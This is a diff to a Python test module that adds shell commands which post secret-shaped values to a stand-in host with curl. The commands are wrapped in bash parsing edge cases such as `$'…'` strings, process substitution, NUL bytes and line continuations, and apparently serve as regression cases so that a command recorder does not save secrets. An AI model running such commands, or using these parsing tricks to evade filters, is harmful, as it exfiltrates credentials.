@@ -233,3 +233,52 @@ _VALUE_FORMS += tuple(f"curl -d {w} {{V}} x.com" for w in _LOOSE)
 _HOST_SHAPED: tuple[str, ...] = (f"{SECRET}.abc", f"eyJhbGciOiJIUzI1NiJ9.{SECRET}.abc")
 
 LEAKY_COMMANDS += tuple(form.format(V=value) for form in _VALUE_FORMS for value in _HOST_SHAPED)
+
+# C2: what c847ff4 saved with the value kept: a `$'…'` string holding `\'` (bash reads it as a
+# quote character inside the string), a process substitution, a NUL (bash drops it), and a
+# redirection in a wrapper's value slot (pinned: the rest is `<arg>`). Each alone, behind each
+# wrapper above, and in each separator form `_VALUE_FORMS` uses.
+_NEW_SHAPES: tuple[str, ...] = (
+    "curl -d $'\\' a {V} ' x.com \\'",
+    "curl -d <(echo a {V} ) x.com",
+    "curl -d >(echo a {V} ) x.com",
+    "curl -d \x00 {V} x.com",
+    "curl \x00-d {V} x.com",
+    "sudo -u >f curl {V} x.com",
+)
+_SEPARATED: tuple[str, ...] = (
+    "{T}",
+    "({T})",
+    "( {T} )",
+    "(({T}) )",
+    "cd a & {T}",
+    "cd a |& {T}",
+    "cd a\n{T}",
+    "curl x.com # \\\n{T}",
+)
+NEW_SHAPE_COMMANDS: tuple[str, ...] = tuple(
+    form.replace("{T}", tail)
+    for tail in (
+        *_NEW_SHAPES,
+        *(f"{w} {t}" for w in _WRAPPED for t in _NEW_SHAPES),
+        *(t.replace(" ", " \\\n ", 1) for t in _NEW_SHAPES),  # a line continuation in it
+    )
+    for form in _SEPARATED
+)
+# C2 (owner 2026-11-14): a command saved unread is named by its first program, past the
+# assignments before it; c847ff4 split them otherwise than bash (a `$'…'` string, a `$(…)`, a
+# backslash before a quote, a space bash does not split on), so the value was saved as the name.
+FIRST_PROGRAM_LEAKS: tuple[str, ...] = (
+    "K=$'\\' {V} '",
+    "K=$'\\' {V} ' $(x)",
+    "K=$(echo {V} x)",
+    "K=\\'x' {V} ' $(x)",
+    "K=a\xa0{V} $(x)",
+    "K=a\v{V} $(x)",
+    "K=a\f{V} $(x)",
+)
+LEAKY_COMMANDS += tuple(
+    form.format(V=value)
+    for form in (*NEW_SHAPE_COMMANDS, *FIRST_PROGRAM_LEAKS)
+    for value in _HOST_SHAPED
+)
